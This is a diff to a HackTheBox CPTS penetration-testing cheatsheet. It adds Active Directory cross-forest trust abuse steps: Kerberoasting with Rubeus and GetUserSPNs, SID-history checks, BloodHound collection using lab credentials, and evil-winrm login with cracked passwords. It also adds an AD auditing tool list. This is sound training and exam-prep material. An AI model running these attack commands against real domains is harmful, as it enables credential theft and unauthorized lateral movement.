@@ -84,7 +84,10 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Miscellanous Configurations](#miscellanous-configurations)
     - [ASREPRoasting](#asreproasting)
     - [Group Policy Object (GPO) Abuse](#Group-Policy-Object-(GPO)-Abuse)
-    - [Trust Relationships](#trust-relationships-child-parent-trusts)
+    - [Domain Trusts Primer](#Domain-Trusts-Primer)
+    - [BloodHound: Domain Trusts & Cross-Forest Analysis](#BloodHound:-Domain-Trusts-and-Cross-Forest-Analysis)
+    - [Trust Relationships Child-Parent Trusts](#trust-relationships-child-parent-trusts)
+    - [Trust Relationships Cross-Forest Trust](#Trust-Relationships-Cross-Forest-Trust)
 - [Login Brute Forcing](#login-brute-forcing)
     - [Hydra](#hydra)
 - [SQLMap](#sqlmap)
@@ -2445,21 +2448,119 @@ ____________________________________________
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
 
-##### Trust Relationships - Cross-Forest
+##### Trust Relationships Cross-Forest Trust
 ```
-# PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.
-Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+========================================================================================
+Cross-Forest Trust Abuse (Windows Path)
+========================================================================================
 
-# PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
-Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
+# 1. Enumerate Kerberoastable Users in Partner Forest
+Get-DomainUser -SPN -Domain <Partner_Domain> | select SamAccountName, memberof
 
-# PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
-Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+# 2. Perform Cross-Forest Kerberoasting (Offline Crack with Hashcat mode 13100)
+.\Rubeus.exe kerberoast /domain:<Partner_Domain> /user:<Target_User> /nowrap
 
-# PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
-Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+# 3. Find "Spies" (Foreign Members in Partner Groups)
+# This identifies users from your domain who have rights in the partner domain.
+Get-DomainForeignGroupMember -Domain <Partner_Domain>
+
+# 4. Access Partner DC (If you have credentials or local admin rights)
+Enter-PSSession -ComputerName <Partner_DC_FQDN> -Credential <Domain>\<User>
+
+# 5. Check for SID History Migration (If SID Filtering is OFF)
+# Look for users with sIDHistory attributes pointing to highly privileged RIDs (-519, -512)
+Get-DomainUser -Domain <Partner_Domain> -Properties sidhistory
+
+========================================================================================
+Cross-Forest Trust Abuse (Linux Attack Path)
+========================================================================================
+
+# 1. DNS Setup (CRITICAL)
+# Edit /etc/resolv.conf to point to the Target Domain Controller
+domain <TARGET_DOMAIN>
+nameserver <TARGET_DC_IP>
+
+example :
+____________________________________________
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+____________________________________________
+or
+____________________________________________
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+____________________________________________
+
+# 2. Cross-Forest Kerberoasting
+# List SPNs in the partner forest
+GetUserSPNs.py -target-domain <PARTNER_DOMAIN> <CURRENT_DOMAIN>/<USER>
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+# Request TGS hash for offline cracking
+GetUserSPNs.py -request -target-domain <PARTNER_DOMAIN> <CURRENT_DOMAIN>/<USER>
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+# 3. BloodHound Enumeration (Python Version)
+# Run against current domain ( NEED DNS SETUP )
+bloodhound-python -d <DOMAIN_A> -dc <DC_A> -c All -u <USER> -p <PASS>
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u wley -p Klmcargo2
+# Run against partner domain ( NEED NEW DNS SETUP ) 
+bloodhound-python -d <DOMAIN_B> -dc <DC_B> -c All -u <USER> -p <PASS>
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u wley@inlanefreight.local -p Klmcargo2
+
+# 4. Accessing the Target (Pass-the-Password)
+# Use the cracked password to log in via WinRM (evil-winrm) or PSExec
+evil-winrm -i <TARGET_DC_IP> -u <USER> -p <CRACKED_PASSWORD>
+
+____________________________________________________________________________________
+The Logic Behind Cross-Forest Enumeration
+____________________________________________________________________________________
+
+# 1. Identity Context: The tool uses the domain suffix in the username (e.g., @inlanefreight.local) to identify where the authentication should start.
+
+# 2. DNS Referrals: The target Domain Controller (specified by -dc) acts as a pointer. Because a Trust exists, DC-B knows how to find DC-A via its own DNS Forwarders.
+
+# 3. Connection Flow:
+#    Attacker -> Target DC (Asks about User)
+#    Target DC -> Attacker (Provides Referral to Home DC)
+#    Attacker -> Home DC (Authenticates & Gets TGT)
+#    Attacker -> Target DC (Uses TGT to get TGS & Collects Data)
+
+# 4. Critical Pre-requisite: 
+#    Your attack host must be able to reach the IP of the Home DC once the Target DC provides the referral. Ping check to both DCs is mandatory.
 ```
+##### AD Auditing Toolkit
+```
+____________________________________________________________________________________
+AD Auditing Toolkit - Proof of Concept & Evidence
+____________________________________________________________________________________
 
+# 1. AD Explorer (Sysinternals) (https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer)
+# Goal: Navigate AD DB and create offline backups.
+- Action: File -> Create Snapshot.
+- Use Case: Offline analysis of user attributes and permissions.
+
+# 2. PingCastle (Health Check & Risk Scoring) (https://www.pingcastle.com/documentation/)
+# Goal: Comprehensive risk assessment report.
+- Interactive Mode: PingCastle.exe
+- Key Option: 1-healthcheck (Scoring the risk of a domain).
+- Pro Tip: Check "Scanner Options" for specific flaws like ZeroLogon or Spooler.
+
+# 3. Group3r (GPO Vulnerability Finder) (https://github.com/Group3r/Group3r)
+# Goal: Find credentials/misconfigurations in Group Policies.
+- Syntax: group3r.exe -f report.log -s
+- Focus: Look for findings indented at the 3rd level.
+
+# 4. ADRecon (Full Domain Inventory)  (https://github.com/adrecon/ADRecon)
+# Goal: Gather massive data into Excel/HTML.
+- Syntax: .\ADRecon.ps1
+- Requirements: Needs Excel installed for auto-report generation.
+- Output: HTML report and CSV folder with all objects.
+
+# 5. Reporting Strategy
+- Use Evidence from these tools to acquire backing/funding for security fixes.
+- Visualize attack paths to make reporting more convincing.
+```
 ## Login Brute Forcing
 
 ##### Hydra
@@ -2569,6 +2670,22 @@ sudo neo4j console
 # run bloodhound
 bloodhound
 
+____________________________________________
+(Recon Tool Decision Tree)
+____________________________________________
+
+# CASE 1: Single Domain / Simple Lab
+# Use bloodhound-python with -ns flag for quick & easy collection.
+bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC_IP> -c all --zip
+
+# CASE 2: Multi-Domain / Forest Trusts
+# MANDATORY: Edit /etc/resolv.conf to point to Forest Root DC.
+# Then run without -ns to allow system-wide resolution and referrals.
+bloodhound-python -d <DOMAIN> -dc <DC_FQDN> -c All -u <USER> -p <PASS>
+
+# CASE 3: Hunting for ADCS Vulnerabilities (ESC1-ESC13)
+# Use RustHound-CE to capture certificate template misconfigurations.
+rusthound -d <DOMAIN> -u <USER> -p <PASS> --adcs --zip
 ```
 ## netexec
 
